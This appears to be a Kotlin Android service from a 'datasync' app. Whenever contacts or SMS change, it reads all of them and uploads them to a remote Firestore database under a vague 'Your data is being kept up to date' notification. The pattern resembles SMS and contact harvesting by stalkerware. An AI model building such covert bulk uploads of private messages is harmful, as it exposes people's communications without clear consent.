package com.datasync.user.sync

import android.app.*
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.database.ContentObserver
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.provider.ContactsContract
import android.provider.Telephony
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import com.datasync.user.MainActivity
import com.datasync.user.data.FirestoreRepository
import com.datasync.user.model.Device
import com.datasync.user.utils.DataHelper
import com.datasync.user.utils.DeviceIdHelper
import com.google.firebase.crashlytics.FirebaseCrashlytics
import kotlinx.coroutines.*

class SyncService : Service() {
    private val serviceScope = CoroutineScope(Dispatchers.IO + Job())
    private val repository = FirestoreRepository()
    private val crashlytics = FirebaseCrashlytics.getInstance()
    private lateinit var deviceId: String

    private var syncJob: Job? = null

    private val contactObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
        override fun onChange(selfChange: Boolean) {
            debouncedSync()
        }
    }

    private val smsObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
        override fun onChange(selfChange: Boolean) {
            debouncedSync()
        }
    }

    override fun onCreate() {
        super.onCreate()
        deviceId = DeviceIdHelper.getDeviceId(this)
        createNotificationChannel()

        val notification = createNotification()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) { // Android 14+
            startForeground(
                1,
                notification,
                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
            )
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) { // Android 10+
            startForeground(
                1,
                notification,
                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
            )
        } else {
            startForeground(1, notification)
        }

        try {
            contentResolver.registerContentObserver(ContactsContract.Contacts.CONTENT_URI, true, contactObserver)
            contentResolver.registerContentObserver(Telephony.Sms.CONTENT_URI, true, smsObserver)
        } catch (e: SecurityException) {
            Log.e("SyncService", "Permission denied for ContentObserver", e)
            crashlytics.recordException(e)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        debouncedSync()
        return START_STICKY
    }

    private fun debouncedSync() {
        syncJob?.cancel()
        syncJob = serviceScope.launch {
            delay(5000) // 5 seconds debounce
            performSync()
        }
    }

    private suspend fun performSync() {
        if (!hasRequiredPermissions()) {
            Log.w("SyncService", "Missing permissions for sync, skipping.")
            return
        }

        try {
            val contacts = DataHelper.fetchContacts(this@SyncService)
            val smsList = DataHelper.fetchSMS(this@SyncService)

            repository.syncContacts(deviceId, contacts)
            repository.syncSMS(deviceId, smsList)

            repository.updateDeviceInfo(Device(
                deviceName = Build.MODEL,
                deviceId = deviceId,
                lastSyncTime = System.currentTimeMillis(),
                contactCount = contacts.size,
                smsCount = smsList.size,
                timestamp = System.currentTimeMillis()
            ))
            Log.d("SyncService", "Sync completed successfully")
        } catch (e: Exception) {
            Log.e("SyncService", "Error during sync", e)
            crashlytics.recordException(e)
        }
    }

    private fun hasRequiredPermissions(): Boolean {
        val permissions = mutableListOf(
            android.Manifest.permission.READ_CONTACTS,
            android.Manifest.permission.READ_SMS
        )
        return permissions.all {
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                "sync_channel",
                "Data Sync Service",
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        val intent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(
            this, 0, intent,
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )

        return NotificationCompat.Builder(this, "sync_channel")
            .setContentTitle("Data Syncing")
            .setContentText("Your data is being kept up to date.")
            .setSmallIcon(android.R.drawable.ic_popup_sync)
            .setContentIntent(pendingIntent)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .build()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        serviceScope.cancel()
        contentResolver.unregisterContentObserver(contactObserver)
        contentResolver.unregisterContentObserver(smsObserver)
    }
}
